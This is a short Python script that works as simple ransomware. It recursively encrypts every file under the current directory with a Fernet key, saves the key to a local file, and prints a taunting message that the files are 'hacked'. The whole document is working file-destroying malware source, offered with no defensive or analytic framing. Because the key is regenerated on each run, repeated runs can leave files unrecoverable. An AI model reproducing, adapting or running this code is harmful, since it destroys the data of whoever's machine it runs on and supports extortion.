#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

def list_files(start_path):
    files_list = []
    
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if file == "enc.py" or file == "theKey.key" or file == "dec.py":
                continue
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                files_list.append(file_path)

    return files_list

def get_key():
    return Fernet.generate_key()

def encrypt(start_path, key):
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if file == "enc.py" or file == "theKey.key" or file == "dec.py" or file == ".env":
                continue
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                with open(file_path, "rb") as File:
                    contents = File.read()
                    # print(contents)
                    contents_encrypted = Fernet(key).encrypt(contents)
                with open(file_path, "wb") as File:
                    File.write(contents_encrypted)

def check_file_exists(file):
    return os.path.exists(file)

key = get_key()
if not check_file_exists("theKey.key"):
    with open("theKey.key", "wb") as theKey:
        theKey.write(key)   

# Example: Traverse from the root directory ("/")
files_list = list_files("./")

# Now 'files' contains the list of all files in the specified directory and its subdirectories
# print(files_list)

encrypt("./", key)
print("Your files are hacked Good luck fixing em!")
